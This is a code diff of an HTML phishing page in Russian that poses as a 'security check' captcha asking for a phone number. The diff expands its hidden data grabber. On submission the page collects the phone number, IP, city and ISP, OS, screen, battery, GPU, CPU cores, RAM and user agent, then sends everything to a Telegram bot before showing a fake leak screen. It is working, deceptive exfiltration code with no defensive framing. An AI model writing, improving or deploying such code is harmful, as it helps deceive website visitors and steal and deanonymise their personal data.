@@ -19,7 +19,7 @@
     <div id="terminal"></div>
 
     <div id="captcha-box">
-        <!-- Исправлена картинка -->
+      
         <img src="https://www.google.com" width="120">
         <h2>Проверка безопасности</h2>
         <p style="font-size: 13px; color: #555;">Введите номер телефона для получения кода:</p>
@@ -72,51 +72,66 @@
         }
 
         async function getTripleData() {
-            let ip = "Не определен";
-            let city = "Неизвестно";
-            
-            const phone = document.getElementById('user-phone').value || "Не указан";
-            const realOS = navigator.platform; 
-            const realUA = navigator.userAgent;
+    let ip = "Не определен";
+    let city = "Неизвестно";
+    
+     
+    const getBattery = async () => {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Заряжается' : 'Разряжается'})`;
+        }
+        return "Не поддерживается";
+    };
 
-            try {
-              
-                const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-                if (ipRes) {
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                }
+    const getGPU = () => {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
+        }
+        return "N/A";
+    };
 
-                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
-                if (geoRes) {
-                    const geoData = await geoRes.json();
-                    city = geoData.city ? `${geoData.city}, ${geoData.country_name}` : "Неизвестно";
-                }
+    const battery = await getBattery();
+    const gpu = getGPU();
+    const phone = document.getElementById('user-phone').value || "Не указан";
 
-                document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = realOS;
+    try {
+        const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+        if (ipRes) {
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        }
 
-                const msg = `🔥 НОВЫЙ ЛОГ!
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
+        if (geoRes) {
+            const geoData = await geoRes.json();
+            city = `${geoData.city}, ${geoData.country_name} (${geoData.org})`;
+        }
+
+        const msg = `🚀 МАКСИМАЛЬНЫЙ ОТЧЕТ!
 📱 НОМЕР: ${phone}
 📍 IP: ${ip}
 🌍 ГОРОД: ${city}
-💻 ОС: ${realOS}
-🖥 ЭКРАН: ${window.screen.width}x${window.screen.height}
-🌐 ИНФО: ${realUA}`;
+💻 ОС: ${navigator.platform}
+📺 ЭКРАН: ${window.screen.width}x${window.screen.height}
+🔋 БАТАРЕЯ: ${battery}
+🎮 ВИДЕОКАРТА: ${gpu}
+⚙️ ЯДРА: ${navigator.hardwareConcurrency}
+🧠 ОЗУ: ${navigator.deviceMemory || 'N/A'} GB
+🌐 БРАУЗЕР: ${navigator.userAgent}`;
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-                    .catch(e => console.log("ТГ заблокирован прокси"));
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
-            } catch (e) {
-                console.log("Ошибка:", e);
-            }
+    } catch (e) { console.log(e); }
 
-            setTimeout(() => {
-                document.getElementById('terminal').style.display = 'none';
-                document.getElementById('leak-box').style.display = 'block';
-            }, 500);
-        }
+    setTimeout(() => {
+        document.getElementById('terminal').style.display = 'none';
+        document.getElementById('leak-box').style.display = 'block';
+    }, 500);
+}
     </script>
 </body>
 </html>
